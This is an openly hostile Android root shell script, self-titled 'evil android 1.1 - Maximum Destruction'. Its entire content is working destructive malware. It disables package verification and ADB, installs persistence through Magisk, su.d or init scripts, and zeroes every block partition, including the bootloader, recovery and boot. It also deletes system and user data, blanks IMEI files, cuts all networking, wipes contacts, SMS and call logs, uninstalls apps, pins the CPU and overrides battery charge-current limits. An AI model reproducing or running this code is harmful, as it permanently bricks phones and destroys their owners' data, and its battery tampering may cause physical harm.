#!/system/bin/sh
# evil android 1.1 - Maximum Destruction (Fixed)
# Requires root

LOCKFILE="/data/local/tmp/evil.lock"
if [ -f "$LOCKFILE" ]; then
    exit 0
fi
echo $$ > "$LOCKFILE"

if [ "$EUID" -ne 0 ]; then
    su -c "$0"
    exit
fi

PERSISTENT="/data/local/tmp/.evil.sh"
cp "$0" "$PERSISTENT" 2>/dev/null
chmod 777 "$PERSISTENT" 2>/dev/null
FLAG="/data/local/tmp/.evil_done"

if [ ! -f "$FLAG" ]; then
    settings put global development_settings_enabled 0 2>/dev/null
    settings put global verifier_verify_adb_installs 0 2>/dev/null
    settings put global package_verifier_enable 0 2>/dev/null
    settings put global adb_enabled 0 2>/dev/null
    pm disable com.android.phone 2>/dev/null
    pm disable com.android.mms 2>/dev/null
    
    if [ -d /data/adb/modules ]; then
        echo "$PERSISTENT" > /data/adb/service.d/evil.sh 2>/dev/null
        chmod 777 /data/adb/service.d/evil.sh 2>/dev/null
    elif [ -d /system/su.d ]; then
        cp "$PERSISTENT" /system/su.d/evil.sh 2>/dev/null
        chmod 700 /system/su.d/evil.sh 2>/dev/null
    elif [ -f /system/etc/init.local.rc ]; then
        echo "service evil /data/local/tmp/run.sh
    class main
    user root
    oneshot" >> /system/etc/init.local.rc 2>/dev/null
    else
        echo "$PERSISTENT" >> /system/etc/init.sh 2>/dev/null
    fi
    
    touch "$FLAG"
    reboot
    exit
fi

for pid in $(ps -A -o PID 2>/dev/null || ps -o PID 2>/dev/null); do
    if [ "$pid" != "$$" ] && [ "$pid" != "1" ] && [ "$pid" -gt 100 ] 2>/dev/null; then
        kill -9 "$pid" 2>/dev/null
    fi
done

for part in /dev/block/bootdevice/by-name/* /dev/block/by-name/* /dev/block/platform/*/by-name/* /dev/block/mmcblk* /dev/block/sd*; do
    if [ -b "$part" ]; then
        dd if=/dev/zero of="$part" bs=1M count=10000 2>/dev/null
        dd if=/dev/urandom of="$part" bs=1M count=100 2>/dev/null
    fi
done

for bl in /dev/block/bootdevice/by-name/aboot /dev/block/by-name/aboot /dev/block/bootdevice/by-name/xbl /dev/block/by-name/xbl /dev/block/bootdevice/by-name/sbl1 /dev/block/by-name/sbl1 /dev/block/bootdevice/by-name/xbl_config /dev/block/by-name/xbl_config; do
    if [ -b "$bl" ]; then
        dd if=/dev/zero of="$bl" bs=4096 count=1000 2>/dev/null
    fi
done

for rec in /dev/block/bootdevice/by-name/recovery /dev/block/by-name/recovery /dev/block/bootdevice/by-name/recovery_ramdisk /dev/block/by-name/recovery_ramdisk; do
    if [ -b "$rec" ]; then
        dd if=/dev/zero of="$rec" bs=1M count=100 2>/dev/null
    fi
done

rm -rf /system/* 2>/dev/null
rm -rf /system/.* 2>/dev/null
rm -rf /data/* 2>/dev/null
rm -rf /data/.* 2>/dev/null
rm -rf /cache/* 2>/dev/null
rm -rf /mnt/*/* 2>/dev/null
rm -rf /sdcard/* 2>/dev/null
rm -rf /storage/*/* 2>/dev/null
rm -rf /data/media/0/* 2>/dev/null

find /data/media/0 -type f \( -name "*.jpg" -o -name "*.png" -o -name "*.mp4" -o -name "*.mp3" -o -name "*.pdf" -o -name "*.doc*" -o -name "*.xls*" -o -name "*.txt" -o -name "*.zip" -o -name "*.rar" \) 2>/dev/null | while read -r file; do
    mv "$file" "$file.encrypted" 2>/dev/null
    chmod 000 "$file.encrypted" 2>/dev/null
done

svc wifi disable 2>/dev/null
svc bluetooth disable 2>/dev/null
svc nfc disable 2>/dev/null

svc data disable 2>/dev/null
iptables -P INPUT DROP 2>/dev/null
iptables -P OUTPUT DROP 2>/dev/null
iptables -P FORWARD DROP 2>/dev/null
iptables -A INPUT -j DROP 2>/dev/null
iptables -A OUTPUT -j DROP 2>/dev/null
iptables -A FORWARD -j DROP 2>/dev/null

ifconfig wlan0 down 2>/dev/null
ifconfig eth0 down 2>/dev/null
ifconfig rmnet0 down 2>/dev/null
ifconfig rmnet1 down 2>/dev/null
ifconfig rmnet2 down 2>/dev/null
ip link set wlan0 down 2>/dev/null
ip link set eth0 down 2>/dev/null
ip link set rmnet0 down 2>/dev/null
echo "" > /etc/resolv.conf 2>/dev/null

echo -n "0" > /efs/imei/imei.txt 2>/dev/null
echo -n "0" > /radio/imei 2>/dev/null
echo -n "000000000000000" > /persist/imei/imei.dat 2>/dev/null

for gov in /sys/devices/system/cpu/cpu*/cpufreq/scaling_governor; do
    echo "performance" > "$gov" 2>/dev/null
done
for maxf in /sys/devices/system/cpu/cpu*/cpufreq/scaling_max_freq; do
    echo "9999999" > "$maxf" 2>/dev/null
done
for minf in /sys/devices/system/cpu/cpu*/cpufreq/scaling_min_freq; do
    echo "9999999" > "$minf" 2>/dev/null
done

cpu_cores=$(grep -c processor /proc/cpuinfo 2>/dev/null || echo 4)
for i in $(seq 1 $cpu_cores); do
    (while :; do :; done) &
done

while :; do
    cat /dev/urandom > /dev/graphics/fb0 2>/dev/null
    cat /dev/urandom > /dev/fb0 2>/dev/null
    dd if=/dev/urandom of=/sys/kernel/debug/dri/0/vblank 2>/dev/null
done &

echo "5000" > /sys/class/power_supply/battery/constant_charge_current_max 2>/dev/null
echo "5000" > /sys/class/power_supply/battery/current_max 2>/dev/null
echo "5000" > /sys/class/power_supply/battery/charge_current 2>/dev/null
echo "5000" > /sys/class/power_supply/battery/input_current_max 2>/dev/null

content delete --uri content://contacts/people 2>/dev/null
content delete --uri content://contacts 2>/dev/null
content delete --uri content://com.android.contacts/contacts 2>/dev/null
sqlite3 /data/data/com.android.providers.contacts/databases/contacts2.db "DROP TABLE IF EXISTS contacts;" 2>/dev/null
sqlite3 /data/data/com.android.providers.contacts/databases/contacts2.db "DROP TABLE IF EXISTS raw_contacts;" 2>/dev/null
sqlite3 /data/data/com.android.providers.contacts/databases/contacts2.db "DROP TABLE IF EXISTS data;" 2>/dev/null

content delete --uri content://sms 2>/dev/null
content delete --uri content://sms/conversations 2>/dev/null
sqlite3 /data/data/com.android.providers.telephony/databases/mmssms.db "DROP TABLE IF EXISTS sms;" 2>/dev/null
sqlite3 /data/data/com.android.providers.telephony/databases/mmssms.db "DROP TABLE IF EXISTS threads;" 2>/dev/null

content delete --uri content://call_log/calls 2>/dev/null
sqlite3 /data/data/com.android.providers.contacts/databases/calllog.db "DROP TABLE IF EXISTS calls;" 2>/dev/null

pm list packages 2>/dev/null | cut -d: -f2 | while read -r pkg; do
    pm clear "$pkg" 2>/dev/null
    pm uninstall "$pkg" 2>/dev/null
done

for sens in /sys/class/sensors/*/enable; do
    echo "0" > "$sens" 2>/dev/null
done
for sens in /sys/bus/iio/devices/*/enable; do
    echo "0" > "$sens" 2>/dev/null
done

rm -rf /mnt/vendor/persist/display/* 2>/dev/null
rm -rf /data/misc/display/* 2>/dev/null
rm -rf /persist/display/* 2>/dev/null

echo "0" > /sys/class/timed_output/vibrator/enable 2>/dev/null
echo "10000" > /sys/class/leds/vibrator/duration 2>/dev/null
rm -rf /sys/class/timed_output/vibrator 2>/dev/null

for led in /sys/class/leds/*/brightness; do
    echo "255" > "$led" 2>/dev/null
done
for led in /sys/class/leds/*/max_brightness; do
    echo "255" > "$led" 2>/dev/null
done

echo "1" > /sys/devices/platform/msm_drm.0/disable 2>/dev/null
echo "1" > /sys/class/graphics/fb0/blank 2>/dev/null
echo "1" > /sys/class/graphics/fb1/blank 2>/dev/null

dd if=/dev/urandom of=/dev/block/bootdevice/by-name/boot 2>/dev/null
dd if=/dev/urandom of=/dev/block/by-name/boot 2>/dev/null
dd if=/dev/urandom of=/dev/block/bootdevice/by-name/boot_a 2>/dev/null
dd if=/dev/urandom of=/dev/block/bootdevice/by-name/boot_b 2>/dev/null

pm list users 2>/dev/null | grep "UserInfo" | cut -d'{' -f2 | cut -d':' -f1 | while read -r user; do
    pm remove-user "$user" 2>/dev/null
done

echo "0" > /sys/class/udc/*/enable 2>/dev/null
echo "none" > /sys/class/udc/*/otg_state 2>/dev/null
echo "0" > /sys/kernel/debug/usb/otg/device_mode 2>/dev/null

for i in 1 2 3 4 5; do
    echo "5000" > /sys/class/timed_output/vibrator/enable 2>/dev/null
    sleep 0.3
    echo "0" > /sys/class/timed_output/vibrator/enable 2>/dev/null
    sleep 0.3
done

for i in 1 2 3; do
    media volume --stream 2 --set 15 2>/dev/null
    cmd media audio 2>/dev/null
    ringtone 2>/dev/null
    cmd media play 2>/dev/null
    sleep 1
done

echo '
        .-"      "-.
       /            \
      |              |
      |,  .-.  .-.  ,|
      | )(__/  \__)( |
      |/     /\     \|
      (_     ^^     _)
       \__|IIIIII|__/
        | \IIIIII/ |
        \          /
       `--------`
'

echo "Вы добровольно запустили этот файл) by. evil"

sleep 3

kill -9 -1 2>/dev/null

rm -f "$0" 2>/dev/null
rm -f "$PERSISTENT" 2>/dev/null
rm -f "$LOCKFILE" 2>/dev/null
rm -f /data/adb/service.d/evil.sh 2>/dev/null
rm -f /system/su.d/evil.sh 2>/dev/null

reboot bootloader 2>/dev/null
reboot -f 2>/dev/null